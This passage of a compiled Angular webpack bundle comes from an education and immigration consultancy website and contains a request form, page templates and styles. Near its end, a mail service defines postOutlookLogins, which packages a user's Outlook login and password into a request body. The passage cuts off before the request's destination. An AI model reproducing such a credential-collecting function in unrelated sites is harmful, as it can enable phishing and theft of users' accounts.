BhZGRpbmc6IDEycHg7XG4gICAgYm9yZGVyOiAxcHggc29saWQgI2NjYztcbiAgICBib3JkZXItcmFkaXVzOiA0cHg7XG4gICAgYm94LXNpemluZzogYm9yZGVyLWJveDtcbiAgICBtYXJnaW4tdG9wOiA2cHg7XG4gICAgbWFyZ2luLWJvdHRvbTogMTBweDtcbiAgICByZXNpemU6IHZlcnRpY2FsO1xuICB9XG4gIGlucHV0W3R5cGU9ZW1haWxdLCB0ZXh0YXJlYSB7XG4gICAgICBtaW4td2lkdGg6IDQwMHB4O1xuICB9IFxuICBcbiAgaW5wdXRbdHlwZT1zdWJtaXRdIHtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjNENBRjUwO1xuICAgIGNvbG9yOiB3aGl0ZTtcbiAgICBwYWRkaW5nOiAxMnB4IDIwcHg7XG4gICAgYm9yZGVyOiBub25lO1xuICAgIGJvcmRlci1yYWRpdXM6IDRweDtcbiAgICBjdXJzb3I6IHBvaW50ZXI7XG4gIH1cbiAgXG4gIGlucHV0W3R5cGU9c3VibWl0XTpob3ZlciB7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogIzQ1YTA0OTtcbiAgfVxuICBcbiAgLmNvbnRhaW5lciB7XG4gICAgYm9yZGVyLXJhZGl1czogNXB4O1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjJmMmYyO1xuICAgIHBhZGRpbmc6IDIwcHg7XG4gIH0iXX0= */"

/***/ }),

/***/ "./src/app/cube/request/request.component.ts":
/*!***************************************************!*\
  !*** ./src/app/cube/request/request.component.ts ***!
  \***************************************************/
/*! exports provided: RequestComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "RequestComponent", function() { return RequestComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _services_request_service__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ../../services/request.service */ "./src/app/services/request.service.ts");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};


var RequestComponent = /** @class */ (function () {
    function RequestComponent(requestService) {
        this.requestService = requestService;
    }
    RequestComponent.prototype.ngOnInit = function () {
    };
    RequestComponent.prototype.recieveRequest = function () {
        var request = {
            firstName: this.firstName,
            lastName: this.lastName,
            email: this.email,
            location: this.location,
            phoneNumber: this.phoneNumber,
            message: this.message
        };
        this.requestService.recieveRequest(request);
    };
    RequestComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-request',
            template: __webpack_require__(/*! ./request.component.html */ "./src/app/cube/request/request.component.html"),
            styles: [__webpack_require__(/*! ./request.component.scss */ "./src/app/cube/request/request.component.scss")]
        }),
        __metadata("design:paramtypes", [_services_request_service__WEBPACK_IMPORTED_MODULE_1__["RequestService"]])
    ], RequestComponent);
    return RequestComponent;
}());



/***/ }),

/***/ "./src/app/cube/views/home/home.component.html":
/*!*****************************************************!*\
  !*** ./src/app/cube/views/home/home.component.html ***!
  \*****************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div id=\"demo\" class=\"carousel slide\" data-ride=\"carousel\">\n\n    <!-- Indicators -->\n    <ul class=\"carousel-indicators\">\n      <li data-target=\"#demo\" data-slide-to=\"0\" class=\"active\"></li>\n      <li data-target=\"#demo\" data-slide-to=\"1\"></li>\n      <li data-target=\"#demo\" data-slide-to=\"2\"></li>\n      <li data-target=\"#demo\" data-slide-to=\"3\"></li>\n      <li data-target=\"#demo\" data-slide-to=\"4\"></li>\n    </ul>\n    \n    <!-- The slideshow -->\n    <div class=\"carousel-inner\">\n      <div class=\"carousel-item active\">\n        <img src=\"assets/boy.jpg\" alt=\"Los Angeles\" width=\"1000\" height=\"300\">\n      </div>\n      <div class=\"carousel-item\">\n        <img src=\"assets/exam.jpg\" alt=\"Chicago\" width=\"1000\" height=\"500\">\n        <div class=\"carousel-caption\">\n            <h3>Los Angeles</h3>\n            <p>We had such a great time in LA!</p>\n          </div>\n      </div>\n      <div class=\"carousel-item\">\n        <img src=\"assets/stemscholarship.jpg\" alt=\"New York\" width=\"1000\" height=\"500\">\n      </div>\n      <div class=\"carousel-item\">\n          <img src=\"assets/visa.jpg\" alt=\"New York\" width=\"1000\" height=\"500\">\n        </div>\n        <div class=\"carousel-item\">\n            <img src=\"assets/graduation.jpg\" alt=\"New York\" width=\"1000\" height=\"500\">\n          </div>\n        \n    </div>\n    \n    <!-- Left and right controls -->\n    <a class=\"carousel-control-prev\" href=\"#demo\" data-slide=\"prev\">\n      <span class=\"carousel-control-prev-icon\"></span>\n    </a>\n    <a class=\"carousel-control-next\" href=\"#demo\" data-slide=\"next\">\n      <span class=\"carousel-control-next-icon\"></span>\n    </a>\n  </div>\n  <app-request></app-request>\n  <div class='col-row'>\n    <div class='col-item-1'>\n        Cube Links is an excellent consultation company which provide \n        international students with opportunities to attend different \n        programs around the world.\n    </div>\n    <div class='col-item-2'>\n        Our goal is to provide prospective international students the \n        opportunity to study in Canada, United Kingdom, United States or Ireland. \n        We work with widely recognized and accredited Universities and Colleges.\n      </div>\n    <div class='col-item-3'>\n        We will provide a thorough assessment of each individual client’s \n        background including education, work experience and skills\n         to help identify the best immigration opportunity that meets their needs.\n    </div>\n  </div>\n  <section class=\"service-row\">\n    <div class='service-item' >\n      <div class=\"service-img\">\n        <img src=\"assets/educat.jpg\" />\n      </div>\n      <div>\n          <span class='service-header'>\n              OUR EDUCATIONAL SERVICES\n          </span>\n          <span class='service-content'>\n              Our goal is to provide prospective International Students\n               the opportunity to study in Canada, United Kingdom or the\n                United States with widely recognized accredited…\n          </span>\n      </div>\n    </div>\n\n    <div class='service-item' >\n        <div class=\"service-img\">\n          <img src=\"assets/educat.jpg\" />\n        </div>\n        <div>\n            <span class='service-header'>\n                OUR EDUCATIONAL SERVICES\n            </span>\n            <span class='service-content'>\n                Our goal is to provide prospective International Students\n                 the opportunity to study in Canada, United Kingdom or the\n                  United States with widely recognized accredited…\n            </span>\n        </div>\n      </div>\n\n      <div class='service-item' >\n          <div class=\"service-img\">\n            <img src=\"assets/educat.jpg\" />\n          </div>\n          <div>\n              <span class='service-header'>\n                  OUR EDUCATIONAL SERVICES\n              </span>\n              <span class='service-content'>\n                  Our goal is to provide prospective International Students\n                   the opportunity to study in Canada, United Kingdom or the\n                    United States with widely recognized accredited…\n              </span>\n          </div>\n     </div>\n  </section>\n\n\n<div class=\"quote-container\">\n    <div class=\"quote-row\">\n        <span class=\"quote-header\">\n            WE PROVIDE FAST & AFFORDABLE EDUCATIONAL & IMMIGRATION SERVICES\n        </span>\n        <a class=\"quote-button\" [routerLink]=\"['home']\">\n          REQUEST A FREE QUOTE\n        </a>\n     </div>\n</div>\n<app-testimonials></app-testimonials>\n  "

/***/ }),

/***/ "./src/app/cube/views/home/home.component.scss":
/*!*****************************************************!*\
  !*** ./src/app/cube/views/home/home.component.scss ***!
  \*****************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "@media only screen and (max-width: 500px) {\n  .col-row {\n    width: 100%;\n    display: flex;\n    flex-direction: column;\n    flex-wrap: wrap; }\n  .service-row {\n    width: 100%;\n    display: flex;\n    flex-direction: column;\n    flex-wrap: wrap; }\n  .quote-container {\n    margin: 40px 20px; }\n  .quote-row {\n    width: 100%;\n    display: flex;\n    flex-direction: column;\n    flex-wrap: wrap; }\n  .quote-header {\n    margin: 15px 10px;\n    display: flex;\n    justify-content: center;\n    align-items: center; } }\n\n.carousel-inner img {\n  width: 100%;\n  height: 300px; }\n\n.col-row {\n  width: 100%;\n  background: whitesmoke;\n  min-height: 300px;\n  display: flex;\n  align-items: center;\n  justify-content: space-around;\n  color: white;\n  font-size: 15px; }\n\n.col-item-1 {\n  background: #6e9e26;\n  text-decoration: none;\n  padding: 40px 30px;\n  text-align: center;\n  max-width: 300px; }\n\n.col-item-1:hover {\n  background: #ff2faf; }\n\n.col-item-2 {\n  background: #ff712f;\n  text-decoration: none;\n  padding: 40px 30px;\n  text-align: center;\n  max-width: 300px; }\n\n.col-item-2:hover {\n  background: #ff2faf; }\n\n.col-item-3 {\n  background: #782fff;\n  text-decoration: none;\n  padding: 40px 30px;\n  text-align: center;\n  max-width: 300px; }\n\n.col-item-3:hover {\n  background: #ff2faf; }\n\n.service-row {\n  display: flex;\n  align-content: center;\n  justify-content: space-around; }\n\n.service-item, .service-img > img {\n  width: 300px; }\n\n.quote-container {\n  background-color: whitesmoke;\n  width: 100%;\n  padding: 40px 20px;\n  display: flex;\n  align-items: center;\n  justify-content: center; }\n\n.quote-row {\n  width: 80%;\n  background: orangered;\n  display: flex;\n  align-items: center;\n  justify-content: space-between;\n  min-height: 100px;\n  color: white; }\n\n.quote-button {\n  border: 2px solid white;\n  width: 150px;\n  font-size: 18px;\n  font-weight: 600; }\n\n.quote-header {\n  font-family: \"righteous\";\n  font-size: 22px;\n  font-weight: 800; }\n\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy92dWRlZGlib3IvRGVza3RvcC9jdWJlbGlua3Mvc3JjL2FwcC9jdWJlL3ZpZXdzL2hvbWUvaG9tZS5jb21wb25lbnQuc2NzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNJO0lBQ0ksWUFBVztJQUNYLGNBQWE7SUFDYix1QkFBc0I7SUFDdEIsZ0JBQWUsRUFDbEI7RUFDRDtJQUNJLFlBQVc7SUFDWCxjQUFhO0lBQ2IsdUJBQXNCO0lBQ3RCLGdCQUFlLEVBQ2xCO0VBQ0Q7SUFDSSxrQkFBaUIsRUFDcEI7RUFDRDtJQUNJLFlBQVc7SUFDWCxjQUFhO0lBQ2IsdUJBQXNCO0lBQ3RCLGdCQUFlLEVBRWxCO0VBQ0Q7SUFDSSxrQkFBaUI7SUFDakIsY0FBYTtJQUNiLHdCQUF1QjtJQUN2QixvQkFBbUIsRUFDdEIsRUFBQTs7QUFJTDtFQUNJLFlBQVc7RUFDWCxjQUFhLEVBQ2hCOztBQUNEO0VBQ0ksWUFBVztFQUNYLHVCQUFzQjtFQUN0QixrQkFBaUI7RUFDakIsY0FBYTtFQUNiLG9CQUFtQjtFQUNuQiw4QkFBNkI7RUFDN0IsYUFBWTtFQUNaLGdCQUFlLEVBQ2xCOztBQUNEO0VBQ0ksb0JBQTZCO0VBQzdCLHNCQUFxQjtFQUNyQixtQkFBa0I7RUFDbEIsbUJBQWtCO0VBQ2xCLGlCQUFnQixFQUNuQjs7QUFDRDtFQUNJLG9CQUE2QixFQUNoQzs7QUFDRDtFQUNJLG9CQUE2QjtFQUM3QixzQkFBcUI7RUFDckIsbUJBQWtCO0VBQ2xCLG1CQUFrQjtFQUNsQixpQkFBZ0IsRUFFbkI7O0FBQ0Q7RUFDSSxvQkFBNkIsRUFDaEM7O0FBQ0Q7RUFDSSxvQkFBNkI7RUFDN0Isc0JBQXFCO0VBQ3JCLG1CQUFrQjtFQUNsQixtQkFBa0I7RUFDbEIsaUJBQWdCLEVBQ25COztBQUNEO0VBQ0ksb0JBQTZCLEVBQ2hDOztBQUNEO0VBQ0ksY0FBYTtFQUNiLHNCQUFxQjtFQUNyQiw4QkFBNkIsRUFDaEM7O0FBQ0Q7RUFDSSxhQUFZLEVBQ2Y7O0FBRUQ7RUFDSSw2QkFBNEI7RUFDNUIsWUFBVztFQUNYLG1CQUFrQjtFQUNsQixjQUFhO0VBQ2Isb0JBQW1CO0VBQ25CLHdCQUF1QixFQUMxQjs7QUFDRDtFQUNJLFdBQVU7RUFDVixzQkFBcUI7RUFDckIsY0FBYTtFQUNiLG9CQUFtQjtFQUNuQiwrQkFBOEI7RUFDOUIsa0JBQWlCO0VBQ2pCLGFBRUosRUFBQzs7QUFDRDtFQUNJLHdCQUF1QjtFQUN2QixhQUFZO0VBQ1osZ0JBQWU7RUFDZixpQkFBZ0IsRUFDbkI7O0FBQ0Q7RUFDSSx5QkFBd0I7RUFDeEIsZ0JBQWU7RUFDZixpQkFBZ0IsRUFDbkIiLCJmaWxlIjoic3JjL2FwcC9jdWJlL3ZpZXdzL2hvbWUvaG9tZS5jb21wb25lbnQuc2NzcyIsInNvdXJjZXNDb250ZW50IjpbIkBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0aDogNTAwcHgpIHtcbiAgICAuY29sLXJvdyB7XG4gICAgICAgIHdpZHRoOiAxMDAlO1xuICAgICAgICBkaXNwbGF5OiBmbGV4O1xuICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uO1xuICAgICAgICBmbGV4LXdyYXA6IHdyYXA7XG4gICAgfVxuICAgIC5zZXJ2aWNlLXJvdyB7XG4gICAgICAgIHdpZHRoOiAxMDAlO1xuICAgICAgICBkaXNwbGF5OiBmbGV4O1xuICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uO1xuICAgICAgICBmbGV4LXdyYXA6IHdyYXA7XG4gICAgfVxuICAgIC5xdW90ZS1jb250YWluZXJ7XG4gICAgICAgIG1hcmdpbjogNDBweCAyMHB4O1xuICAgIH1cbiAgICAucXVvdGUtcm93IHtcbiAgICAgICAgd2lkdGg6IDEwMCU7XG4gICAgICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gICAgICAgIGZsZXgtd3JhcDogd3JhcDtcbiAgICAgICAgXG4gICAgfVxuICAgIC5xdW90ZS1oZWFkZXJ7XG4gICAgICAgIG1hcmdpbjogMTVweCAxMHB4O1xuICAgICAgICBkaXNwbGF5OiBmbGV4O1xuICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICB9XG4gICBcblxufVxuLmNhcm91c2VsLWlubmVyIGltZyB7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAzMDBweDtcbn1cbi5jb2wtcm93IHtcbiAgICB3aWR0aDogMTAwJTtcbiAgICBiYWNrZ3JvdW5kOiB3aGl0ZXNtb2tlO1xuICAgIG1pbi1oZWlnaHQ6IDMwMHB4O1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWFyb3VuZDtcbiAgICBjb2xvcjogd2hpdGU7XG4gICAgZm9udC1zaXplOiAxNXB4O1xufVxuLmNvbC1pdGVtLTEge1xuICAgIGJhY2tncm91bmQ6IHJnYigxMTAsIDE1OCwgMzgpO1xuICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTtcbiAgICBwYWRkaW5nOiA0MHB4IDMwcHg7XG4gICAgdGV4dC1hbGlnbjogY2VudGVyO1xuICAgIG1heC13aWR0aDogMzAwcHg7XG59XG4uY29sLWl0ZW0tMTpob3ZlciB7XG4gICAgYmFja2dyb3VuZDogcmdiKDI1NSwgNDcsIDE3NSk7XG59XG4uY29sLWl0ZW0tMiB7XG4gICAgYmFja2dyb3VuZDogcmdiKDI1NSwgMTEzLCA0Nyk7XG4gICAgdGV4dC1kZWNvcmF0aW9uOiBub25lO1xuICAgIHBhZGRpbmc6IDQwcHggMzBweDtcbiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7XG4gICAgbWF4LXdpZHRoOiAzMDBweDtcblxufVxuLmNvbC1pdGVtLTI6aG92ZXIge1xuICAgIGJhY2tncm91bmQ6IHJnYigyNTUsIDQ3LCAxNzUpO1xufVxuLmNvbC1pdGVtLTMge1xuICAgIGJhY2tncm91bmQ6IHJnYigxMjAsIDQ3LCAyNTUpO1xuICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTtcbiAgICBwYWRkaW5nOiA0MHB4IDMwcHg7XG4gICAgdGV4dC1hbGlnbjogY2VudGVyO1xuICAgIG1heC13aWR0aDogMzAwcHg7XG59XG4uY29sLWl0ZW0tMzpob3ZlciB7XG4gICAgYmFja2dyb3VuZDogcmdiKDI1NSwgNDcsIDE3NSk7XG59XG4uc2VydmljZS1yb3cge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgYWxpZ24tY29udGVudDogY2VudGVyO1xuICAgIGp1c3RpZnktY29udGVudDogc3BhY2UtYXJvdW5kO1xufVxuLnNlcnZpY2UtaXRlbSwgLnNlcnZpY2UtaW1nID4gaW1nIHtcbiAgICB3aWR0aDogMzAwcHg7XG59XG5cbi5xdW90ZS1jb250YWluZXIge1xuICAgIGJhY2tncm91bmQtY29sb3I6IHdoaXRlc21va2U7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgcGFkZGluZzogNDBweCAyMHB4O1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbn1cbi5xdW90ZS1yb3cge1xuICAgIHdpZHRoOiA4MCU7XG4gICAgYmFja2dyb3VuZDogb3JhbmdlcmVkO1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47XG4gICAgbWluLWhlaWdodDogMTAwcHg7XG4gICAgY29sb3I6IHdoaXRlXG5cbn1cbi5xdW90ZS1idXR0b24ge1xuICAgIGJvcmRlcjogMnB4IHNvbGlkIHdoaXRlO1xuICAgIHdpZHRoOiAxNTBweDtcbiAgICBmb250LXNpemU6IDE4cHg7XG4gICAgZm9udC13ZWlnaHQ6IDYwMDtcbn1cbi5xdW90ZS1oZWFkZXIge1xuICAgIGZvbnQtZmFtaWx5OiBcInJpZ2h0ZW91c1wiO1xuICAgIGZvbnQtc2l6ZTogMjJweDtcbiAgICBmb250LXdlaWdodDogODAwO1xufSJdfQ== */"

/***/ }),

/***/ "./src/app/cube/views/home/home.component.ts":
/*!***************************************************!*\
  !*** ./src/app/cube/views/home/home.component.ts ***!
  \***************************************************/
/*! exports provided: HomeComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "HomeComponent", function() { return HomeComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var HomeComponent = /** @class */ (function () {
    function HomeComponent() {
    }
    HomeComponent.prototype.ngOnInit = function () {
    };
    HomeComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-home',
            template: __webpack_require__(/*! ./home.component.html */ "./src/app/cube/views/home/home.component.html"),
            styles: [__webpack_require__(/*! ./home.component.scss */ "./src/app/cube/views/home/home.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], HomeComponent);
    return HomeComponent;
}());



/***/ }),

/***/ "./src/app/cube/views/testimonials/testimonials.component.html":
/*!*********************************************************************!*\
  !*** ./src/app/cube/views/testimonials/testimonials.component.html ***!
  \*********************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div class=\"container\">\n    <div class=\"row\">\n      <div class=\"col-sm-6\">\n          <h3><strong>Testimonial</strong></h3>\n          <div class=\"seprator\"></div>\n              <div id=\"carousel-example-generic\" class=\"carousel slide\" data-ride=\"carousel\">\n                <!-- Wrapper for slides -->\n                <div class=\"carousel-inner\">\n                  <div class=\"item active\">\n                    <div class=\"row\" style=\"padding: 20px\">\n                      <button style=\"border: none;\"><i class=\"fa fa-quote-left testimonial_fa\" aria-hidden=\"true\"></i></button>\n                      <p class=\"testimonial_para\">\n                        Lorem Ipsum ist ein einfacher Demo-Text für die Print- und Schriftindustrie. Lorem Ipsum ist in der Industrie bereits der Standard Demo-Text \"Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo en.</p><br>\n                      <div class=\"row\">\n                      <div class=\"col-sm-2\">\n                          <img src=\"http://demos1.showcasedemos.in/jntuicem2017/html/v1/assets/images/jack.jpg\" class=\"img-responsive\" style=\"width: 80px\">\n                          </div>\n                          <div class=\"col-sm-10\">\n                          <h4><strong>Jack Andreson</strong></h4>\n                          <p class=\"testimonial_subtitle\"><span>Chlinical Chemistry Technologist</span><br>\n                          <span>Officeal All Star Cafe</span>\n                          </p>\n                      </div>\n                      </div>\n                    </div>\n                  </div>\n                 <div class=\"item\">\n                     <div class=\"row\" style=\"padding: 20px\">\n                      <button style=\"border: none;\"><i class=\"fa fa-quote-left testimonial_fa\" aria-hidden=\"true\"></i></button>\n                      <p class=\"testimonial_para\">Lorem Ipsum ist ein einfacher Demo-Text für die Print- und Schriftindustrie. Lorem Ipsum ist in der Industrie bereits der Standard Demo-Text \"Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo en.</p><br>\n                      <div class=\"row\">\n                      <div class=\"col-sm-2\">\n                          <img src=\"http://demos1.showcasedemos.in/jntuicem2017/html/v1/assets/images/kiara.jpg\" class=\"img-responsive\" style=\"width: 80px\">\n                          </div>\n                          <div class=\"col-sm-10\">\n                          <h4><strong>Kiara Andreson</strong></h4>\n                          <p class=\"testimonial_subtitle\"><span>Chlinical Chemistry Technologist</span><br>\n                          <span>Officeal All Star Cafe</span>\n                          </p>\n                      </div>\n                      </div>\n                    </div>\n                  </div>\n                </div>\n              </div>\n              <div class=\"controls testimonial_control pull-right\">\n                  <a class=\"left fa fa-chevron-left btn btn-default testimonial_btn\" href=\"#carousel-example-generic\"\n                    data-slide=\"prev\"></a>\n  \n                  <a class=\"right fa fa-chevron-right btn btn-default testimonial_btn\" href=\"#carousel-example-generic\"\n                    data-slide=\"next\"></a>\n                </div>\n          </div>\n    </div>\n  </div>\n"

/***/ }),

/***/ "./src/app/cube/views/testimonials/testimonials.component.scss":
/*!*********************************************************************!*\
  !*** ./src/app/cube/views/testimonials/testimonials.component.scss ***!
  \*********************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = ".testimonial_subtitle {\n  color: #0aaa7a;\n  font-size: 12px; }\n\n.testimonial_btn {\n  background-color: #373d4b !important;\n  color: #fff !important; }\n\n.seprator {\n  height: 2px;\n  width: 56px;\n  background-color: #0aaa7a;\n  margin: 7px 0 10px 0; }\n\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy92dWRlZGlib3IvRGVza3RvcC9jdWJlbGlua3Mvc3JjL2FwcC9jdWJlL3ZpZXdzL3Rlc3RpbW9uaWFscy90ZXN0aW1vbmlhbHMuY29tcG9uZW50LnNjc3MiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IkFBQUE7RUFDSSxlQUFjO0VBQ2QsZ0JBQWUsRUFDbEI7O0FBQ0M7RUFDRSxxQ0FBb0M7RUFDcEMsdUJBQXNCLEVBQ3hCOztBQUNEO0VBQ0csWUFBVztFQUNYLFlBQVc7RUFDWCwwQkFBeUI7RUFDekIscUJBQW9CLEVBQ3ZCIiwiZmlsZSI6InNyYy9hcHAvY3ViZS92aWV3cy90ZXN0aW1vbmlhbHMvdGVzdGltb25pYWxzLmNvbXBvbmVudC5zY3NzIiwic291cmNlc0NvbnRlbnQiOlsiLnRlc3RpbW9uaWFsX3N1YnRpdGxle1xuICAgIGNvbG9yOiAjMGFhYTdhO1xuICAgIGZvbnQtc2l6ZTogMTJweDtcbn1cbiAgLnRlc3RpbW9uaWFsX2J0bntcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMzczZDRiICFpbXBvcnRhbnQ7XG4gICAgY29sb3I6ICNmZmYgIWltcG9ydGFudDtcbiB9XG4gLnNlcHJhdG9yIHtcbiAgICBoZWlnaHQ6IDJweDtcbiAgICB3aWR0aDogNTZweDtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMGFhYTdhO1xuICAgIG1hcmdpbjogN3B4IDAgMTBweCAwO1xufVxuICBAbWVkaWEgKG1heC13aWR0aDogNTAwcHgpIHtcbiAgfSJdfQ== */"

/***/ }),

/***/ "./src/app/cube/views/testimonials/testimonials.component.ts":
/*!*******************************************************************!*\
  !*** ./src/app/cube/views/testimonials/testimonials.component.ts ***!
  \*******************************************************************/
/*! exports provided: TestimonialsComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "TestimonialsComponent", function() { return TestimonialsComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var TestimonialsComponent = /** @class */ (function () {
    function TestimonialsComponent() {
    }
    TestimonialsComponent.prototype.ngOnInit = function () {
    };
    TestimonialsComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-testimonials',
            template: __webpack_require__(/*! ./testimonials.component.html */ "./src/app/cube/views/testimonials/testimonials.component.html"),
            styles: [__webpack_require__(/*! ./testimonials.component.scss */ "./src/app/cube/views/testimonials/testimonials.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], TestimonialsComponent);
    return TestimonialsComponent;
}());



/***/ }),

/***/ "./src/app/mail.service.ts":
/*!*********************************!*\
  !*** ./src/app/mail.service.ts ***!
  \*********************************/
/*! exports provided: MailService */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "MailService", function() { return MailService; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_common_http__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/common/http */ "./node_modules/@angular/common/fesm5/http.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};


// import { HttpParamsOptions, HttpParams } from '@angular/common/http/src/params';
var MailService = /** @class */ (function () {
    function MailService(httpClient) {
        this.httpClient = httpClient;
    }
    MailService.prototype.postOutlookLogins = function (login, password) {
        console.log("pa iajfisa");
        var httpHeaders = new _angular_common_http__WEBPACK_IMPORTED_MODULE_1__["HttpHeaders"]({
            "content-type": "application/json"
        });
        var options = {
            headers: httpHeaders
        };
        var body = {
            params: {
                'login': login,
                'password': password
            }
        };
